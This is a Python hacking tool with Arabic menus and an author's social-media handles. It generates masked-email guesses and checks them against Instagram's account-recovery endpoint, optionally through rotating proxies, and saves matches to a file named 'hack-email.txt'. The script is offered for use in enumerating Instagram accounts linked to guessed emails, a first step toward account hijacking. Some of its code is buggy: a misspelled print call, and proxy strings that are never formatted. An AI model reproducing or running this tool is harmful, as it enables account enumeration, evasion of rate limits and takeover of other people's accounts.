import requests
import secrets
import time
from time import sleep
import random
r = requests.session()
sleep(1)
print(f"""
𝑖𝑛𝑠𝑡𝑎  : @6𝑔7𝑟_ℎ𝑒𝑟𝑒
𝑇𝑒𝑙𝑒𝑔𝑟𝑎𝑚 : 𝑙6𝑔7𝑟𝑙
───────█████████████████████
────████▀─────────────────▀████
──███▀───────────────────────▀███
─██▀───────────────────────────▀██{sleep(1)}
█▀───────────────────────────────▀█
█─────────────────────────────────█
█─────────────────────────────────█
█─────────────────────────────────█
█───█████─────────────────█████───█
█──██▓▓▓███─────────────███▓▓▓██──█
█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
──█▄────▀█████▀─────▀█████▀────▄█
─▄██───────────▄█─█▄───────────██▄
─███───────────██─██───────────███
─███───────────────────────────███
──▀██──██▀██──█──█──█──██▀██──██▀
───▀████▀─██──█──█──█──██─▀████▀
────▀██▀──██──█──█──█──██──▀██▀
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
───────────█▄▄█▄▄█▄▄█▄▄█
  


""")
print("""
————————————————@6𝑔7𝑟_ℎ𝑒𝑟𝑒——————————————
١ = تخمين ربط الايميل بالانستا وحفظه بملف
٢ = انشاء الايميلات وحفظها بملف
——————————————————————————————————————————————
""")
yy = input("1,2 :")
if("2")in yy:
  aaa = input(" اول حرف من الايميل المشفر: ")
  b = input(" : اخر حرف من الايميل المشفر")
  sleep(1)
  print("""
————————————————☠︎︎——————————————
@gmail.com
@hotmail.com
@yahoo.com
----------------------------------------
""")
  email = input(" دومين الايميل : ")
  pas = int(input('كم حرف مشفر : '))
  sleep(1)
  if("@gmail.com")in email:
    while True:
      sleep(0)
      ppp = secrets.token_urlsafe(pas)
      emaill = (f"{aaa}{ppp}{b}{email}")
      print(emaill)
      with open("email.txt", "a") as mix:
        mix.write(f"{emaill}\n")
        mix.close()
  if("@hotmail.com")in email:
    while True:
      sleep(0.1)
      ppp = secrets.token_urlsafe(pas)
      emaill = (f"{aaa}{ppp}{b}{email}")
      print(emaill)
      with open("email.txt", "a") as mix:
        mix.write(f"{emaill}\n")
        mix.close()
  if("@yahoo.com")in email:
    while True:
      sleep(0.1)
      ppp = secrets.token_urlsafe(pas)
      emaill = (f"{aaa}{ppp}{b}{email}")
      print(emaill)
      with open("email.txt", "a") as mix:
        mix.write(f"{emaill}\n")
        mix.close()
  else:
     print("دومين خاطئ")

if("1")in yy:
  
   
  print("""
————————————————@6𝑔7𝑟_ℎ𝑒𝑟e——————————————
‎    1 - ببروكسيات
‎   2 - بدون بروكسيات
——————————————————————————————————————————————
  
  """)
  ab = input("1,2 : ")
  if ("2") in ab:
    f = input("[<>]  file email")
    file  = open(f).read().splitlines()
    for file in file:
      url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'

      headers = {
			'Accept': '/',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.5',
			'Connection': 'keep-alive',
			'Content-Length': '81',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': 'missing',
			'Host': 'www.instagram.com',
			'Origin': 'https://www.instagram.com/',
			'Referer': 'https://www.instagram.com/accounts/password/reset/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
			'X-CSRFToken': 'missing',
			'X-IG-App-ID': '936619743392459',
			'X-IG-WWW-Claim': '0',
			'X-Instagram-AJAX': 'bba907d2f110',
			'X-Requested-With': 'XMLHttpRequest'
		}
      data = {
			'email_or_username': file,
			'recaptcha_challenge_field': '',
			'flow': '',
			'app_id': ''
		}
      sleep(10)
      req = requests.post(url, headers=headers, data=data).text
      if "No users found" in req:
        print( f'Bad email !!! >> : {file}')
      if "Please wait a few minutes before you try again." in req:
        prinr("The tool has been blocked")
      elif "Email Sent"in req:
        
        print( f'Good email !!! >> : {file}')
        with open("hack-email.txt", "a") as mix:
          
          mix.write(f"{file}\n")
          mix.close()
      

  if ("1") in ab:    
    f = input("[<>]  file email")
    file  = open(f).read().splitlines()
    proxy = open('proxy.txt','r').read().splitlines()
    proxylist = []
    while True:
      for pxr in proxy:
        proxylist.append(pxr)
        pxx = str(random.choice(proxylist))#insta 6g7r_here
        
      for file in file:
          url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'

          headers = {
			'Accept': '/',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.5',
			'Connection': 'keep-alive',
			'Content-Length': '81',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': 'missing',
			'Host': 'www.instagram.com',
			'Origin': 'https://www.instagram.com/',
			'Referer': 'https://www.instagram.com/accounts/password/reset/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
			'X-CSRFToken': 'missing',
			'X-IG-App-ID': '936619743392459',
			'X-IG-WWW-Claim': '0',
			'X-Instagram-AJAX': 'bba907d2f110',
			'X-Requested-With': 'XMLHttpRequest'
		}
          data = {
			'email_or_username': file,
			'recaptcha_challenge_field': '',
			'flow': '',
			'app_id': ''
		}
          try:
            proxx = {
			'http': 'http://{pxx}',
			'https': 'http://{pxx}'
			}
            sleep(0.1)
            req = requests.post(url, headers=headers, data=data,proxies=proxx,timeout=3).text
            if "No users found" in req:
              print( f'Bad email !!! >> : {file}')
            elif "Email Sent"in req:
              print( f'Good email !!! >> : {file}')
              with open("hack-email.txt", "a") as mix:
               mix.write(f"{file}\n")
               mix.close()
          except requests.exceptions.ConnectionError:
              pass
              print(f"Bad Proxy : {pxx}")
